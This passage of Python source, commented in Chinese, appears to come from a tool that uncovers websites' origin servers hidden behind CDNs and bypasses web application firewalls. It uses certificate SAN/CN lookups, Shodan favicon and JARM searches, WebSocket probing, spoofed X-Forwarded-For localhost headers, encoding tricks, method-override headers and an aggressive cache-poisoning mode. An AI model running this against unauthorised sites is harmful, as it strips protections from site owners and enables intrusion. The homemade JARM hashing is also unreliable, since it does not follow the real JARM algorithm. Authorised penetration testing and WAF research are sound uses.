                        resolver.timeout = 2
                        resolver.lifetime = 2
                        return resolver.resolve(san_domain, 'A')
                    
                    answers = await asyncio.to_thread(_sync_san_resolve)
                    san_servers = []
                    for rdata in answers:
                        ip = str(rdata)
                        if not self._is_cdn_ip(ip):
                            san_servers.append(OriginServer(
                                ip=ip,
                                confidence=0.85 if is_potential_origin else 0.65,
                                discovery_method=f'ssl_san_{san_domain}',
                                ports=[443]
                            ))
                            self.logger.info(f"[+] SSL SAN发现潜在源站域名: {san_domain} -> {ip}")
                    return san_servers
            except:
                return []
        
        # 并发解析所有SAN域名
        if san_list:
            san_tasks = [_resolve_san_domain(san_domain) for san_domain in san_list]
            san_results = await asyncio.gather(*san_tasks, return_exceptions=True)
            
            # 合并结果
            for result in san_results:
                if isinstance(result, list):
                    servers.extend(result)
            
            # 额外检查：证书CN (Common Name) - 异步修复
            if 'subject' in cert:
                async def _resolve_cn_domain(cn_value):
                    if cn_value != domain and any(pattern in cn_value.lower() for pattern in origin_patterns):
                        try:
                            def _sync_cn_resolve():
                                resolver = dns.resolver.Resolver()
                                resolver.timeout = 2
                                resolver.lifetime = 2
                                return resolver.resolve(cn_value, 'A')
                            
                            answers = await asyncio.to_thread(_sync_cn_resolve)
                            cn_servers = []
                            for rdata in answers:
                                ip = str(rdata)
                                if not self._is_cdn_ip(ip):
                                    cn_servers.append(OriginServer(
                                        ip=ip,
                                        confidence=0.8,
                                        discovery_method=f'ssl_cn_{cn_value}',
                                        ports=[443]
                                    ))
                            return cn_servers
                        except:
                            return []
                    return []
                
                # 提取所有CN值
                cn_values = []
                for rdn in cert['subject']:
                    for name, value in rdn:
                        if name == 'commonName':
                            cn_values.append(value)
                
                # 并发解析所有CN域名
                if cn_values:
                    cn_tasks = [_resolve_cn_domain(cn_val) for cn_val in cn_values]
                    cn_results = await asyncio.gather(*cn_tasks, return_exceptions=True)
                    
                    # 合并结果
                    for result in cn_results:
                        if isinstance(result, list):
                            servers.extend(result)
                                            
        except socket.timeout:
            self.logger.warning(f"[!] SSL连接超时: {domain}")
        except ssl.SSLError as e:
            self.logger.warning(f"[!] SSL错误: {type(e).__name__}")
        except Exception as e:
            self.logger.warning(f"[!] SSL SAN分析失败: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_favicon_hash(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """通过favicon哈希查找 - 增强版"""
        servers = []
        
        # 常见默认favicon的mmh3哈希值
        default_favicon_hashes = [
            -1198808341,  # Apache默认
            -297069493,   # nginx默认
            1485257654,   # IIS默认
            -38705358,    # Tomcat默认
            628535358,    # Spring Boot默认
            -1255347784,  # WordPress默认
            -235701012,   # phpMyAdmin
            1405460984,   # XAMPP
            2128230701,   # DirectAdmin
            -1277814690   # React默认
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                favicon_url = url.rstrip('/') + '/favicon.ico'
                async with session.get(favicon_url, ssl=False) as resp:
                    if resp.status == 200:
                        favicon_data = await resp.read()
                        
                        # 计算mmh3哈希
                        if HAS_MMH3:
                            favicon_hash = mmh3.hash(base64.b64encode(favicon_data).decode())
                        else:
                            favicon_hash = mmh3_hash_fallback(base64.b64encode(favicon_data).decode())
                        
                        # 检查是否为默认favicon
                        if favicon_hash in default_favicon_hashes:
                            self.logger.warning(f"[!] 检测到默认favicon，跳过搜索")
                            return servers
                        
                        # 检查favicon大小（太小或太大的可能是通用的）
                        favicon_size = len(favicon_data)
                        if favicon_size < 100 or favicon_size > 50000:
                            self.logger.warning(f"[!] Favicon大小异常 ({favicon_size} bytes)，降低置信度")
                            confidence_modifier = 0.5
                        else:
                            confidence_modifier = 1.0
                        
                        if self.shodan_client:
                            try:
                                self.logger.info("    [*] [耗时操作] 正在通过Shodan API反查Favicon哈希...")
                                # 异步Shodan favicon搜索 - 修复阻塞
                                def _sync_favicon_search():
                                    query = f'http.favicon.hash:{favicon_hash}'
                                    return self.shodan_client.search(query, limit=10)
                                
                                results = await asyncio.to_thread(_sync_favicon_search)
                                
                                self.logger.info("    [+] Favicon反查完成。")
                                
                                for result in results['matches']:
                                    ip = result['ip_str']
                                    if not self._is_cdn_ip(ip):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.9 * confidence_modifier,
                                            discovery_method='favicon_hash',
                                            ports=[result.get('port', 80)],
                                            services={'favicon_hash': str(favicon_hash)}
                                        ))
                            except shodan.APIError as e:
                                self.logger.error(f"[!] Shodan API错误: {e}")
                                
        except Exception as e:
            self.logger.warning(f"[!] Favicon哈希搜索异常: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _find_via_websocket_leak(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """通过WebSocket泄露查找"""
        servers = []
        
        # WebSocket常见端点
        ws_endpoints = [
            '/ws', '/websocket', '/socket.io/', '/wss',
            '/api/ws', '/api/websocket', '/stream',
            '/notifications', '/events', '/chat',
            '/cable', '/sockjs', '/bayeux'  # Rails ActionCable, SockJS, Faye
        ]
        
        base_url = url.rstrip('/')
        test_urls = []
        
        # 构建测试URL
        for endpoint in ws_endpoints:
            ws_url = base_url.replace('http://', 'ws://').replace('https://', 'wss://') + endpoint
            test_urls.append(ws_url)
        
        # 添加根路径WebSocket
        test_urls.append(base_url.replace('http://', 'ws://').replace('https://', 'wss://'))
        
        async with aiohttp.ClientSession() as session:
            for ws_url in test_urls:
                try:
                    # 尝试WebSocket握手
                    async with session.ws_connect(
                        ws_url,
                        timeout=aiohttp.ClientTimeout(total=5),
                        ssl=False,
                        headers={
                            'Origin': base_url,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    ) as ws:
                        # 成功连接，提取真实IP信息
                        # 从响应头或连接信息中查找IP泄露
                        
                        # 发送测试消息
                        await ws.send_str('{"type":"ping"}')
                        
                        # 等待响应（可能包含服务器信息）
                        try:
                            msg = await asyncio.wait_for(ws.receive(), timeout=2)
                            if msg.type == aiohttp.WSMsgType.TEXT:
                                data = msg.data
                                
                                # 查找IP地址模式
                                import re
                                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                                found_ips = re.findall(ip_pattern, data)
                                
                                for ip in found_ips:
                                    if not self._is_cdn_ip(ip) and not ip.startswith('192.168.'):
                                        servers.append(OriginServer(
                                            ip=ip,
                                            confidence=0.8,
                                            discovery_method='websocket_leak',
                                            ports=[80, 443]
                                        ))
                        except asyncio.TimeoutError:
                            pass
                        
                        await ws.close()
                        self.logger.info(f"[+] WebSocket连接成功: {ws_url}")
                        
                except aiohttp.WSServerHandshakeError as e:
                    # 握手失败但可能暴露信息
                    if hasattr(e, 'headers'):
                        # 检查错误响应头
                        server_header = e.headers.get('Server', '')
                        if 'nginx' in server_header.lower() or 'apache' in server_header.lower():
                            # 可能是真实服务器
                            pass
                            
                except aiohttp.ClientConnectorError:
                    # 连接失败
                    continue
                except aiohttp.ClientError:
                    # 其他客户端错误
                    continue
                except asyncio.TimeoutError:
                    # 超时
                    continue
                except Exception as e:
                    if 'SSL' not in str(e):  # 忽略SSL错误
                        self.logger.warning(f"[!] WebSocket测试异常 ({ws_url}): {type(e).__name__} - {str(e)[:50]}")
        
        return servers
    
    async def _find_via_jarm_fingerprint(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """通过JARM指纹识别找源站"""
        servers = []
        domain = self._extract_domain(url)
        
        try:
            # 首先获取目标的JARM指纹
            target_jarm = await self._get_jarm_fingerprint(domain, 443, use_proxy)
            if not target_jarm:
                self.logger.error(f"[!] 无法获取目标JARM指纹: {domain}")
                return servers
            
            self.logger.info(f"[+] 目标JARM指纹: {target_jarm[:32]}...")
            
            # 如果有Shodan，搜索相同JARM的服务器 - 异步修复
            if self.shodan_client:
                try:
                    self.logger.info("    [*] [耗时操作] 正在通过Shodan API反查JARM指纹，这可能需要几分钟，请耐心等待...")
                    # 异步Shodan JARM搜索 - 修复阻塞
                    def _sync_jarm_search():
                        query = f'ssl.jarm:{target_jarm}'
                        return self.shodan_client.search(query, limit=50)
                    
                    results = await asyncio.to_thread(_sync_jarm_search)
                    
                    self.logger.info("    [+] JARM反查完成。")
                    
                    for result in results['matches']:
                        ip = result['ip_str']
                        
                        # 过滤掉CDN IP
                        if not self._is_cdn_ip(ip):
                            # 二次验证：直接测试这个IP的JARM
                            test_jarm = await self._get_jarm_fingerprint(ip, result.get('port', 443))
                            if test_jarm == target_jarm:
                                servers.append(OriginServer(
                                    ip=ip,
                                    confidence=0.95,  # JARM匹配置信度极高
                                    discovery_method='jarm_fingerprint',
                                    ports=[result.get('port', 443)],
                                    services={'jarm': target_jarm[:32]}
                                ))
                                self.logger.info(f"[+] JARM指纹匹配！发现潜在源站: {ip}")
                                
                except shodan.APIError as e:
                    self.logger.error(f"[!] Shodan JARM搜索失败: {e}")
            
            # 本地扫描：测试已知IP的JARM
            # 从其他方法获取的IP列表
            if hasattr(self, '_candidate_ips'):
                for ip in self._candidate_ips:
                    test_jarm = await self._get_jarm_fingerprint(ip, 443)
                    if test_jarm == target_jarm:
                        servers.append(OriginServer(
                            ip=ip,
                            confidence=0.95,
                            discovery_method='jarm_fingerprint_local',
                            ports=[443]
                        ))
                        
        except Exception as e:
            self.logger.error(f"[!] JARM指纹分析失败: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    async def _get_jarm_fingerprint(self, host: str, port: int, use_proxy: bool = False) -> Optional[str]:
        """获取主机的JARM指纹完整实现"""
        # 先检查缓存
        cache_key = f"{host}:{port}"
        if cache_key in self._cache['jarm']:
            cache_entry = self._cache['jarm'][cache_key]
            if time.time() - cache_entry['time'] < self._cache_ttl:
                self._cache_hits += 1
                return cache_entry['result']
        
        try:
            # JARM的10个特定TLS探针
            jarm_probes = [
                # 1. TLS 1.2, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None
                },
                # 2. TLS 1.2, SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': None
                },
                # 3. TLS 1.2, no SNI, ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': ['h2', 'http/1.1']
                },
                # 4. TLS 1.2, SNI, ALPN, cipher order: reverse
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'REVERSE',
                    'use_sni': True,
                    'alpn': ['h2', 'http/1.1']
                },
                # 5. TLS 1.2, SNI, ALPN, cipher order: top half
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'TOP_HALF',
                    'use_sni': True,
                    'alpn': ['h2', 'http/1.1']
                },
                # 6. TLS 1.2, no SNI, no ALPN, cipher order: middle out  
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'MIDDLE_OUT',
                    'use_sni': False,
                    'alpn': None
                },
                # 7. TLS 1.1, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_1,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None
                },
                # 8. TLS 1.3, no SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLS,  # TLS 1.3
                    'cipher_list': 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384',
                    'cipher_order': 'FORWARD',
                    'use_sni': False,
                    'alpn': None,
                    'max_version': ssl.TLSVersion.TLSv1_3
                },
                # 9. TLS 1.3, SNI, no ALPN
                {
                    'tls_version': ssl.PROTOCOL_TLS,
                    'cipher_list': 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': None,
                    'max_version': ssl.TLSVersion.TLSv1_3
                },
                # 10. TLS 1.2, GREASE values
                {
                    'tls_version': ssl.PROTOCOL_TLSv1_2,
                    'cipher_list': 'ALL:COMPLEMENTOFALL',
                    'cipher_order': 'FORWARD',
                    'use_sni': True,
                    'alpn': ['grease', 'h2', 'http/1.1'],
                    'grease': True
                }
            ]
            
            jarm_results = []
            
            for i, probe in enumerate(jarm_probes):
                try:
                    # 创建SSL上下文
                    context = ssl.SSLContext(probe['tls_version'])
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    # 设置最大TLS版本（用于TLS 1.3）
                    if 'max_version' in probe:
                        context.maximum_version = probe['max_version']
                    
                    # 设置密码套件
                    cipher_list = probe['cipher_list']
                    
                    # 处理密码顺序
                    if probe['cipher_order'] == 'REVERSE':
                        # 反转密码列表
                        ciphers = cipher_list.split(':')
                        cipher_list = ':'.join(reversed(ciphers))
                    elif probe['cipher_order'] == 'TOP_HALF':
                        # 只使用前半部分
                        ciphers = cipher_list.split(':')
                        cipher_list = ':'.join(ciphers[:len(ciphers)//2])
                    elif probe['cipher_order'] == 'MIDDLE_OUT':
                        # 从中间开始向外排序
                        ciphers = cipher_list.split(':')
                        mid = len(ciphers) // 2
                        reordered = []
                        for i in range(mid):
                            if mid + i < len(ciphers):
                                reordered.append(ciphers[mid + i])
                            if mid - i - 1 >= 0:
                                reordered.append(ciphers[mid - i - 1])
                        cipher_list = ':'.join(reordered)
                    
                    try:
                        context.set_ciphers(cipher_list)
                    except:
                        # 如果设置失败，使用默认
                        pass
                    
                    # 设置ALPN
                    if probe.get('alpn'):
                        try:
                            context.set_alpn_protocols(probe['alpn'])
                        except:
                            pass
                    
                    # 异步建立连接 - 修复JARM socket阻塞和代理支持
                    async def _jarm_probe_connection():
                        self.logger.debug(f"[JARM调试] 开始探测: {host}:{port}")
                        self.logger.debug(f"[JARM调试] 代理模式: {use_proxy}")
                        
                        if use_proxy and PROXY_AVAILABLE:
                            # 代理模式 - JARM指纹探测在代理下比较复杂，暂时跳过
                            self.logger.debug(f"[JARM调试] 代理模式下跳过JARM探测")
                            return None, None, None
                        else:
                            # 直连模式 - 原始JARM探测
                            def _sync_jarm_connect():
                                self.logger.debug(f"[JARM调试] 直连探测: {host}:{port}")
                                try:
                                    sock = socket.create_connection((host, port), timeout=5)
                                    # SNI设置
                                    server_hostname = host if probe['use_sni'] else None
                                    ssock = context.wrap_socket(sock, server_hostname=server_hostname)
                                    
                                    # 收集TLS信息
                                    cipher = ssock.cipher()
                                    version = ssock.version()
                                    cert = ssock.getpeercert()
                                    
                                    ssock.close()
                                    sock.close()
                                    
                                    self.logger.debug(f"[JARM调试] 探测成功")
                                    return cipher, version, cert
                                except ssl.SSLError as e:
                                    self.logger.warning(f"[JARM调试] SSL握手失败: {type(e).__name__}")
                                    raise e
                                except socket.error as e:
                                    self.logger.warning(f"[JARM调试] 套接字连接失败: {type(e).__name__}")
                                    raise e
                            
                            return await asyncio.to_thread(_sync_jarm_connect)
                    
                    try:
                        cipher, version, cert = await _jarm_probe_connection()
                        
                        # 生成结果字符串
                        result = f"{cipher[0] if cipher else '0'}|{cipher[2] if cipher and len(cipher) > 2 else '0'}|{version}|{'1' if cert else '0'}"
                        jarm_results.append(result)
                        
                    except ssl.SSLError as e:
                        # SSL错误也是指纹的一部分
                        error_code = getattr(e, 'errno', 0)
                        jarm_results.append(f"error|{error_code}|0|0")
                            
                except socket.timeout:
                    jarm_results.append("timeout|0|0|0")
                except Exception as e:
                    jarm_results.append(f"error|{type(e).__name__}|0|0")
            
            # 生成JARM哈希
            jarm_raw = ';'.join(jarm_results)
            
            # JARM使用特定的哈希方法
            # 先SHA256，然后格式化为 JARM 格式
            sha256_hash = hashlib.sha256(jarm_raw.encode()).digest()
            
            # 转换为JARM格式：前30个字节的十六进制 + 最后2个字节的十六进制
            jarm_hash = sha256_hash.hex()
            formatted_jarm = f"{jarm_hash[:30]}{jarm_hash[-4:]}"
            
            # 缓存结果
            self._cache['jarm'][cache_key] = {
                'result': formatted_jarm,
                'time': time.time()
            }
            
            return formatted_jarm
            
        except Exception as e:
            self.logger.warning(f"[!] JARM指纹获取失败 ({host}:{port}): {type(e).__name__} - {str(e)[:50]}")
            return None
    
    async def _find_via_unique_headers(self, url: str, use_proxy: bool = False) -> List[OriginServer]:
        """通过独特响应头查找 - 增强版"""
        servers = []
        
        try:
            # 使用代理或直连
            if use_proxy and PROXY_AVAILABLE:
                result = await get_proxy_session()
                if result:
                    session, proxy_url = result
                    try:
                        async with session.get(url, ssl=False, proxy=proxy_url) as resp:
                            headers = dict(resp.headers)
                            return await self._process_unique_headers_response(headers, servers)
                    finally:
                        await session.close()
                        return servers
            
            # 直连模式
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False) as resp:
                    headers = dict(resp.headers)
                    
                    # 过滤出真正独特的响应头
                    common_headers = [
                        'date', 'content-type', 'content-length', 'connection', 
                        'server', 'cache-control', 'expires', 'pragma', 'vary',
                        'accept-ranges', 'etag', 'last-modified', 'x-powered-by',
                        'x-frame-options', 'x-content-type-options', 'strict-transport-security'
                    ]
                    
                    unique_headers = []
                    for header, value in headers.items():
                        header_lower = header.lower()
                        # 排除常见头和CDN头
                        if (header_lower not in common_headers and 
                            not any(cdn in header_lower for cdn in ['cloudflare', 'akamai', 'fastly', 'cloudfront', 'incapsula'])):
                            # 额外检查：值必须足够独特（长度>10且不是常见值）
                            if len(value) > 10 and value not in ['none', 'true', 'false', '0', '1']:
                                unique_headers.append(f'{header}: {value}')
                    
                    if unique_headers and self.shodan_client:
                        # 异步Shodan头部搜索 - 修复阻塞
                        async def _search_unique_header(header):
                            try:
                                def _sync_header_search():
                                    query = f'"{header}"'
                                    return self.shodan_client.search(query, limit=5)
                                
                                results = await asyncio.to_thread(_sync_header_search)
                                header_servers = []
                                for result in results['matches']:
                                    ip = result['ip_str']
                                    if not self._is_cdn_ip(ip):
                                        # 检查是否真的包含相同的头
                                        if header in str(result):
                                            header_servers.append(OriginServer(
                                                ip=ip,
                                                confidence=0.4,  # 降低初始置信度
                                                discovery_method='unique_headers',
                                                ports=[result.get('port', 80)]
                                            ))
                                return header_servers
                            except:
                                return []
                        
                        # 并发搜索最独特的1-2个头
                        header_tasks = [_search_unique_header(header) for header in unique_headers[:2]]
                        header_results = await asyncio.gather(*header_tasks, return_exceptions=True)
                        
                        # 合并结果
                        for result in header_results:
                            if isinstance(result, list):
                                servers.extend(result)
                                
        except Exception as e:
            self.logger.warning(f"[!] 响应头搜索异常: {type(e).__name__} - {str(e)[:100]}")
        
        return servers
    
    def _build_bypass_strategy(self, waf_type: Optional[str], aggressive: bool) -> List[Dict]:
        """构建绕过策略"""
        strategies = []
        
        # 基础策略 - 始终尝试
        base_strategies = [
            {'name': 'direct_origin', 'function': self._bypass_via_origin_ip},
            {'name': 'header_manipulation', 'function': self._bypass_via_headers},
            {'name': 'encoding_bypass', 'function': self._bypass_via_encoding},
            {'name': 'method_override', 'function': self._bypass_via_method_override}
        ]
        
        strategies.extend(base_strategies)
        
        # WAF特定策略 - 移除复杂的http_smuggling和graphql，避免无限循环
        if waf_type and waf_type in self.waf_signatures:
            priority_methods = self.waf_signatures[waf_type].get('bypass_priority', [])
            for method in priority_methods:
                if method == 'websocket':
                    strategies.append({'name': 'websocket', 'function': self._bypass_via_websocket})
                elif method == 'chunked_encoding':
                    strategies.append({'name': 'chunked', 'function': self._bypass_via_chunked})
                # 注释掉复杂策略，这些将在auto_bypass中单独执行
                # elif method == 'http_smuggling':
                #     strategies.append({'name': 'smuggling', 'function': self._bypass_via_smuggling})
                # elif method == 'graphql':
                #     strategies.append({'name': 'graphql', 'function': self._bypass_via_graphql})
        
        # 激进模式额外策略
        if aggressive:
            aggressive_strategies = [
                {'name': 'cache_poison', 'function': self._bypass_via_cache_poison},
                {'name': 'protocol_confusion', 'function': self._bypass_via_protocol_confusion},
                {'name': 'parameter_pollution', 'function': self._bypass_via_hpp},
                {'name': 'edge_cases', 'function': self._bypass_via_edge_cases}  # 新增：边缘案例
            ]
            strategies.extend(aggressive_strategies)
        
        return strategies
    
    def _build_simple_bypass_strategy(self, waf_type: Optional[str], aggressive: bool) -> List[Dict]:
        """构建简单绕过策略 - 只包含单请求类型，避免复杂扫描器的无限循环"""
        strategies = []
        
        # 基础策略 - 始终尝试
        base_strategies = [
            {'name': 'direct_origin', 'function': self._bypass_via_origin_ip},
            {'name': 'header_manipulation', 'function': self._bypass_via_headers},
            {'name': 'encoding_bypass', 'function': self._bypass_via_encoding},
            {'name': 'method_override', 'function': self._bypass_via_method_override}
        ]
        
        strategies.extend(base_strategies)
        
        # WAF特定的简单策略 - 排除复杂扫描器
        if waf_type and waf_type in self.waf_signatures:
            priority_methods = self.waf_signatures[waf_type].get('bypass_priority', [])
            for method in priority_methods:
                if method == 'websocket':
                    strategies.append({'name': 'websocket', 'function': self._bypass_via_websocket})
                elif method == 'chunked_encoding':
                    strategies.append({'name': 'chunked', 'function': self._bypass_via_chunked})
                # http_smuggling和graphql在auto_bypass中单独执行，不加入循环
        
        # 激进模式的简单策略
        if aggressive:
            aggressive_strategies = [
                {'name': 'cache_poison', 'function': self._bypass_via_cache_poison},
                {'name': 'protocol_confusion', 'function': self._bypass_via_protocol_confusion},
                {'name': 'parameter_pollution', 'function': self._bypass_via_hpp},
                {'name': 'edge_cases', 'function': self._bypass_via_edge_cases}
            ]
            strategies.extend(aggressive_strategies)
        
        return strategies
    
    async def _execute_bypass_strategy(self, url: str, strategy: Dict, 
                                     origin_servers: List[OriginServer]) -> BypassResult:
        """执行单个绕过策略"""
        try:
            self.logger.info(f"[*] 尝试绕过方法: {strategy['name']}")
            
            # 传递源站信息给需要的策略
            if strategy['name'] == 'direct_origin':
                result = await strategy['function'](url, origin_servers)
            else:
                result = await strategy['function'](url)
            
            if result.success:
                self.logger.info(f"[+] 绕过成功: {strategy['name']}")
            else:
                self.logger.warning(f"[-] 绕过失败: {strategy['name']} - {result.details.get('error', '未知原因')}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"[!] 策略执行失败 {strategy['name']}: {type(e).__name__} - {e}")
            return BypassResult(
                success=False,
                method=strategy['name'],
                url=url,
                details={'error': f'策略执行异常: {type(e).__name__} - {str(e)}'}
            )
    
    async def _bypass_via_origin_ip(self, url: str, origin_servers: List[OriginServer]) -> BypassResult:
        """直连源站IP绕过"""
        if not origin_servers:
            return BypassResult(
                success=False,
                method='direct_origin',
                url=url,
                details={'error': 'No origin servers found'}
            )
        
        domain = self._extract_domain(url)
        
        for server in origin_servers:
            if server.confidence < 0.5:  # 跳过低置信度的服务器
                continue
                
            try:
                # 构建直连URL
                parsed = urllib.parse.urlparse(url)
                direct_url = f"{parsed.scheme}://{server.ip}{parsed.path}"
                if parsed.query:
                    direct_url += f"?{parsed.query}"
                
                # 测试直连
                async with aiohttp.ClientSession() as session:
                    headers = {
                        'Host': domain,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                    
                    async with session.get(
                        direct_url,
                        headers=headers,
                        ssl=False,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            # 验证是否真的是目标站点
                            if domain in content or parsed.hostname in content:
                                result = BypassResult(
                                    success=True,
                                    method='direct_origin',
                                    url=direct_url,
                                    details={
                                        'origin_ip': server.ip,
                                        'confidence': server.confidence,
                                        'discovery_method': server.discovery_method,
                                        'content': content,
                                        'headers': dict(resp.headers)
                                    },
                                    confidence=0.5  # 临时值，立即重新评估
                                )
                                # 【数学引擎】动态置信度评估
                                result.confidence = self.scorer.assess(result)
                                return result
            except:
                continue
        
        return BypassResult(
            success=False,
            method='direct_origin',
            url=url,
            details={
                'error': f'所有源站直连尝试失败，共测试{len(origin_servers)}个源站IP',
                'tested_servers': [f"{s.ip} (置信度: {s.confidence:.1%})" for s in origin_servers],
                'confidence_threshold': 0.5,
                'failure_reason': 'direct_connection_blocked_or_invalid_servers'
            }
        )
    
    async def _bypass_via_headers(self, url: str) -> BypassResult:
        """通过请求头操纵绕过"""
        test_headers = [
            self.bypass_headers.copy(),
            {
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1,10.0.0.1,172.16.0.1',
                'X-Real-IP': '10.0.0.1'
            },
            {
                'X-Forwarded-For': '127.0.0.1',
                'X-Forwarded-Host': 'localhost',
                'X-Rewrite-URL': url
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for headers in test_headers:
                try:
                    async with session.get(
                        url,
                        headers=headers,
                        ssl=False,
                        allow_redirects=False
                    ) as resp:
                        if resp.status in [200, 301, 302]:
                            content = await resp.text()
                            # 检查是否真的绕过了WAF
                            if not any(waf_sig in content.lower() 
                                     for waf_sig in ['cloudflare', 'access denied', 'forbidden']):
                                result = BypassResult(
                                    success=True,
                                    method='header_manipulation',
                                    url=url,
                                    details={
                                        'headers_used': headers,
                                        'content': content,
                                        'headers': dict(resp.headers)
                                    },
                                    confidence=0.5  # 临时值，立即重新评估
                                )
                                # 【数学引擎】动态置信度评估
                                result.confidence = self.scorer.assess(result)
                                return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='header_manipulation',
            url=url
        )
    
    async def _bypass_via_encoding(self, url: str) -> BypassResult:
        """通过编码绕过"""
        parsed = urllib.parse.urlparse(url)
        
        # 准备各种编码的payload
        if parsed.query:
            # 对查询参数进行各种编码
            params = urllib.parse.parse_qs(parsed.query)
            
            encoding_tests = []
            for encoder_name, encoder_func in self.encoders.items():
                encoded_params = {}
                for key, values in params.items():
                    encoded_params[encoder_func(key)] = [encoder_func(v) for v in values]
                
                # 重构URL
                encoded_query = urllib.parse.urlencode(encoded_params, doseq=True)
                encoded_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"
                encoding_tests.append((encoder_name, encoded_url))
        else:
            # 对路径进行编码
            encoding_tests = []
            for encoder_name, encoder_func in self.encoders.items():
                if parsed.path and len(parsed.path) > 1:
                    encoded_path = encoder_func(parsed.path)
                    encoded_url = f"{parsed.scheme}://{parsed.netloc}{encoded_path}"
                    encoding_tests.append((encoder_name, encoded_url))
        
        # 测试各种编码
        async with aiohttp.ClientSession() as session:
            for encoder_name, encoded_url in encoding_tests:
                try:
                    async with session.get(
                        encoded_url,
                        headers=self.bypass_headers,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            result = BypassResult(
                                success=True,
                                method='encoding_bypass',
                                url=encoded_url,
                                details={
                                    'encoding': encoder_name,
                                    'content': content,
                                    'headers': dict(resp.headers)
                                },
                                confidence=0.5  # 临时值，立即重新评估
                            )
                            # 【数学引擎】动态置信度评估
                            result.confidence = self.scorer.assess(result)
                            return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='encoding_bypass',
            url=url
        )
    
    async def _bypass_via_method_override(self, url: str) -> BypassResult:
        """通过HTTP方法覆盖绕过"""
        override_headers = [
            {'X-HTTP-Method-Override': 'GET'},
            {'X-HTTP-Method': 'GET'},
            {'X-Method-Override': 'GET'},
            {'_method': 'GET'}
        ]
        
        async with aiohttp.ClientSession() as session:
            # 尝试用POST请求配合方法覆盖头
            for headers in override_headers:
                try:
                    headers.update(self.bypass_headers)
                    async with session.post(
                        url,
                        headers=headers,
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            result = BypassResult(
                                success=True,
                                method='method_override',
                                url=url,
                                details={
                                    'override_header': headers,
                                    'content': content,
                                    'headers': dict(resp.headers)
                                },
                                confidence=0.5  # 临时值，立即重新评估
                            )
                            # 【数学引擎】动态置信度评估
                            result.confidence = self.scorer.assess(result)
                            return result
                except:
                    continue
        
        return BypassResult(
            success=False,
            method='method_override',
            url=url
        )
    
    async def _bypass_via_websocket(self, url: str) -> BypassResult:
        """通过WebSocket绕过完整实现"""
        parsed = urllib.parse.urlparse(url)
        ws_scheme = 'wss' if parsed.scheme == 'https' else 'ws'
        
        # WebSocket绕过技术
        websocket_techniques = [
            # 1. 直接WebSocket升级
            {
                'name': 'direct_upgrade',
                'url': f"{ws_scheme}://{parsed.netloc}{parsed.path or '/'}",
                'headers': {
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Version': '13',
                    'Sec-WebSocket-Key': base64.b64encode(os.urandom(16)).decode()
                }
            },
            # 2. 伪装HTTP请求为WebSocket消息
            {
                'name': 'http_over_ws',
                'url': f"{ws_scheme}://{parsed.netloc}/",
                'payload': f"GET {parsed.path or '/admin'} HTTP/1.1\r\nHost: {parsed.netloc}\r\n\r\n"
            },
            # 3. Socket.IO绕过
            {
                'name': 'socketio',
                'url': f"{ws_scheme}://{parsed.netloc}/socket.io/?transport=websocket",
                'headers': {
                    'Origin': f"{parsed.scheme}://{parsed.netloc}"
                }
            },
            # 4. 子协议绕过
            {
                'name': 'subprotocol',
                'url': f"{ws_scheme}://{parsed.netloc}{parsed.path or '/'}",
                'subprotocols': ['http', 'xmpp', 'mqtt']
            }
        ]
        
        async with aiohttp.ClientSession() as session:
            for technique in websocket_techniques:
                try:
                    ws_url = technique['url']
                    
                    # 构建WebSocket连接参数
                    ws_kwargs = {
                        'ssl': False,
